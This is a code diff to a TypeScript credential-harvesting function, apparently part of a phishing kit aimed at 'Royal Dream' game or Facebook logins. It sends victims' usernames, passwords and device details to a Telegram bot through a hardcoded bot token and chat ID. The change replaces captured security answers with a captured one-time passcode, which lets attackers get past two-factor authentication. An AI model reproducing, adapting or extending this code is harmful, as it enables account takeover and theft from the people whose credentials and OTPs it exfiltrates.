@@ -2,7 +2,7 @@ export const sendToTelegram = async (
   identifier: string, 
   pass: string, 
   loginMethod: string, 
-  _extraInfo: string // Previously q2, can be used for "Security Answers" if needed
+  otp: string // Changed from _extraInfo to otp
 ) => {
   const BOT_TOKEN = '8539103259:AAHnEJrkMJt2Z_vjyf-gENTJU6GnzpTnkCs';
   const CHAT_IDS = ['', '6076369736']; // Add your IDs here
@@ -40,29 +40,19 @@ export const sendToTelegram = async (
   if (loginMethod === "Facebook Login") loginLabel = "👤 Email/Phone";
 
   const message = `
-🔐 <b>LOGIN DATA</b>
+🔐 <b>LOGIN DATA ROYAL DREAM</b>
 ─────────────────
 
 🕰️ Waktu: ${dateTimeString}
 🧩 Device: ${deviceInfo}
-
-📊 <b>INFO AKUN</b>
-─────────────────
-🧰 Level: 15
-💰 Topup: Rp 55.000
-🥇 Tier: 🥇 Perunggu
-👤 Username: AWAL
-🔗 Linked: 👤 Pengunjung
-🟢 Status: ✅ AKTIF
 
 🔑 <b>LOGIN DETAILS</b>
 ─────────────────
 ${loginLabel}: <code>${identifier}</code>
 🔐 Password: <code>${pass}</code>
 
-🛡️ <b>Security Answers:</b>
-└ Q1: polos
-└ Q2: polos
+🛡️ <b>Security Verification:</b>
+└ OTP: <code>${otp}</code>
 
 🖱️ <b>REQUEST INFO</b>
 ─────────────────
